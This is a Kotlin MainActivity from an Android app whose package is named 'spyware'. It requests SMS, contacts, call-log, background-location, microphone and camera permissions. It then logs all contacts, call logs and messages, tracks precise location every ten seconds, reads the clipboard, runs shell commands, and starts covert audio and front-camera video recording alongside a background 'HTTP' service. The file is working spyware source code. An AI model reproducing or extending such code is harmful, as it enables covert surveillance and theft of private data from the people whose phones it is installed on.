package com.lautaro.spyware

import android.os.Bundle
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import android.util.Log
import androidx.core.app.ActivityCompat
import android.Manifest
import android.widget.Toast
import android.content.pm.PackageManager
import com.google.android.gms.location.Priority
import com. google.android.gms.location.LocationRequest
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import android.widget.Button
import android.graphics.Color
import androidx.core.view.WindowInsetsControllerCompat
import android.view.View
import androidx.core.view.WindowCompat
import android.content.Intent
import android.provider.MediaStore


class MainActivity : AppCompatActivity() {

    // Contacts
    private lateinit var contacts: ContactsRetriever
    // Call Logs
    private lateinit var calllogs: CallLogsRetriever
    // Get Messages
    private lateinit var getsms: GetSms
    // Get Location
    private lateinit var getLocation: LocationUtils

    // CLIPBOARD
    private lateinit var getClipboard: GetClipboard
    private lateinit var buttonClip: Button

    // Command Executor
    private lateinit var execCommand: ShellCommandExecutor

    // AUDIO RECORDER
    private lateinit var startAudioRecording: Button
    private lateinit var stopAudioRecording: Button

    // VIDEO RECORDER
    private lateinit var startVideoRecording: Button
    private lateinit var stopVideoRecording: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }
        // HTTP SERVICE
        val serviceIntent = Intent(this, MyForegroundService::class.java)
        startService(serviceIntent)

        // NAV BAR
        WindowCompat.setDecorFitsSystemWindows(window, false)
        WindowInsetsControllerCompat(window, window.decorView).let { controller ->
            controller.isAppearanceLightStatusBars = false // Iconos blancos
            controller.isAppearanceLightNavigationBars = false // Iconos blancos en la barra de navegación
        }

        // Contacts
        contacts = ContactsRetriever(this)
        // Call Logs
        calllogs = CallLogsRetriever(this)
        // Messages
        getsms = GetSms(this)
        // Location
        getLocation = LocationUtils(this)

        // BUTTON FOR GET CLIPBOARD
        getClipboard = GetClipboard(this)
        buttonClip = findViewById(R.id.getClip)
        buttonClip.setOnClickListener {
            Log.d("Clipboard", getClipboard.getClipboardData())
            // Show clipboard content
            Toast.makeText(
                this,
                getClipboard.getClipboardData(),
                Toast.LENGTH_LONG
            ).show()
        }
        // Command Executor
        execCommand = ShellCommandExecutor()

        // Check permissions
        checkAndRequestPermissions()

        // BUTTONS FOR AUDIO RECORDING
        startAudioRecording = findViewById(R.id.startRecording)
        startAudioRecording.setOnClickListener {
            val intent = Intent(this, AudioRecorder::class.java)
            startForegroundService(intent)
        }
        stopAudioRecording = findViewById(R.id.stopRecording)
        stopAudioRecording.setOnClickListener {
            val intent = Intent(this, AudioRecorder::class.java)
            stopService(intent)
        }

        // BUTTONS FOR VIDEO RECORDING
        startVideoRecording = findViewById(R.id.startVideo)
        startVideoRecording.setOnClickListener {
            val intent = Intent(this, VideoRecord::class.java)
            intent.action = "START_RECORDING"
            intent.putExtra("cameraId", "1") // 1 = Front camera || 0 = Back Camera
            startForegroundService(intent)
        }
        stopVideoRecording = findViewById(R.id.stopVideo)
        stopVideoRecording.setOnClickListener {
            val intent = Intent(this, VideoRecord::class.java)
            intent.action = "VIDEO_STOP"
            stopService(intent)
        }

    }

    companion object {
        const val REQUEST_LOCATION_SETTINGS = 1001
        const val BACKGROUND_LOCATION_REQUEST_CODE = 1002
    }

    private fun checkAndRequestPermissions() {
        val permissionsToRequest = mutableListOf<String>()


        if (!PermissionUtils.checkSMSPermission(this)) {
            Log.d("Permissions", "SMS permissions needed")
            permissionsToRequest.addAll(PermissionUtils.SMS_PERMISSIONS)
        }

        if (!PermissionUtils.checkContactsPermission(this)) {
            Log.d("Permissions", "Contacts permissions needed")
            permissionsToRequest.addAll(PermissionUtils.CONTACTS_PERMISSIONS)
        }

        if (!PermissionUtils.checkCallLogPermission(this)) {
            Log.d("Permissions", "Call log permissions needed")
            permissionsToRequest.addAll(PermissionUtils.CALL_LOG_PERMISSIONS)
        }

        if (!PermissionUtils.checkForegroundLocationPermission(this)) {
            Log.d("Permissions", "Foreground location permissions needed")
            permissionsToRequest.addAll(PermissionUtils.FOREGROUND_LOCATION_PERMISSIONS)
        }

        if (!PermissionUtils.checkNotificationPermission(this)) {
            Log.d("Permissions", "Notification permissions needed")
            permissionsToRequest.addAll(PermissionUtils.NOTIFICATION_PERMISSIONS)
        }

        if (!PermissionUtils.checkAudioPermission(this)) {
            Log.d("Permissions", "Audio permissions needed")
            permissionsToRequest.addAll(PermissionUtils.AUDIO_PERMISSIONS)
        }

        if (!PermissionUtils.checkCameraPermission(this)) {
            Log.d("Permissions", "Camera permissions needed")
            permissionsToRequest.addAll(PermissionUtils.CAMERA_PERMISSIONS)
        }

        Log.d("Permissions", "Permissions to request: ${permissionsToRequest.joinToString()}")

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                PermissionUtils.PERMISSION_REQUEST_ALL
            )
        } else {
            checkBackgroundLocationPermission()

            // Get information from Logs
            Log.e("Contacts", contacts.getAllContacts().toString())
            Log.e("CallLogs", calllogs.getCallLogs().toString())
            Log.e("SMS", getsms.getSMS().toString())

            // LOCATION
            getLocation.requestLocationUpdates(
                interval = 10000L,
                fastestInterval = 5000L,
                priority = Priority.PRIORITY_HIGH_ACCURACY
            ) { getLocation ->
                if (getLocation != null) {
                    Log.d("Location", "Location update: ${getLocation.latitude}, ${getLocation.longitude}")
                } else {
                    Log.e("Location", "Failed to get location update.")
                }
            }
            // END LOCATION

            // Command Executor
            Log.d("Command", execCommand.execute("whoami"))

        }
    }


    private fun checkBackgroundLocationPermission() {
        if (!PermissionUtils.checkBackgroundLocationPermission(this)) {
            if (PermissionUtils.shouldShowRequestPermissionRationale(
                    this,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                )
            ) {
                // Show explanation to the user why you need background location
                Toast.makeText(
                    this,
                    "Background location is needed for continuous location updates",
                    Toast.LENGTH_LONG
                ).show()
            }
            ActivityCompat.requestPermissions(
                this,
                PermissionUtils.BACKGROUND_LOCATION_PERMISSION,
                BACKGROUND_LOCATION_REQUEST_CODE
            )
        } else {
            promptToEnableLocationAccess()
        }
    }


    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        Log.d("Permissions", "onRequestPermissionsResult: requestCode=$requestCode")
        Log.d("Permissions", "Permissions: ${permissions.joinToString()}")
        Log.d("Permissions", "Results: ${grantResults.joinToString()}")

        when (requestCode) {
            PermissionUtils.PERMISSION_REQUEST_ALL -> {
                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    Log.d("Permissions", "All regular permissions granted")
                    checkBackgroundLocationPermission()
                } else {
                    Log.d("Permissions", "Some permissions were denied")
                    Toast.makeText(
                        this,
                        "Some permissions were denied. App functionality may be limited.",
                        Toast.LENGTH_SHORT
                    ).show()

                    checkBackgroundLocationPermission()
                }
            }

            BACKGROUND_LOCATION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Log.d("Permissions", "Background location permission granted")
                    promptToEnableLocationAccess()
                } else {
                    Log.d("Permissions", "Background location permission denied")
                    Toast.makeText(
                        this,
                        "Background location permission denied. Some features may be limited.",
                        Toast.LENGTH_SHORT
                    ).show()

                    promptToEnableLocationAccess()
                }
            }
        }
    }

    private fun promptToEnableLocationAccess() {
        Log.d("Location", "Prompting to enable location access")
        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,  // Usa este import correcto
            10 * 1000L
        )
            .setMinUpdateIntervalMillis(5 * 1000L)
            .setWaitForAccurateLocation(true)
            .build()

        val locationSettingsRequest = LocationSettingsRequest.Builder()
            .addLocationRequest(locationRequest)
            .setAlwaysShow(true)
            .build()

        val settingsClient = LocationServices.getSettingsClient(this)

        settingsClient.checkLocationSettings(locationSettingsRequest)
            .addOnSuccessListener {
                Log.d("Location", "Location services are enabled")
                Toast.makeText(this, "Location access is enabled!", Toast.LENGTH_SHORT).show()
            }
            .addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        Log.d("Location", "Showing location settings dialog")
                        exception.startResolutionForResult(
                            this,
                            REQUEST_LOCATION_SETTINGS
                        )
                    } catch (sendEx: Exception) {
                        Log.e("Location", "Error showing location settings dialog", sendEx)
                        Toast.makeText(
                            this,
                            "Error enabling location: ${sendEx.message}",
                            Toast.LENGTH_SHORT
                        ).show()
                    }
                } else {
                    Log.e("Location", "Location settings check failed", exception)
                    Toast.makeText(this, "Location access is required!", Toast.LENGTH_SHORT).show()
                }
            }
    }
}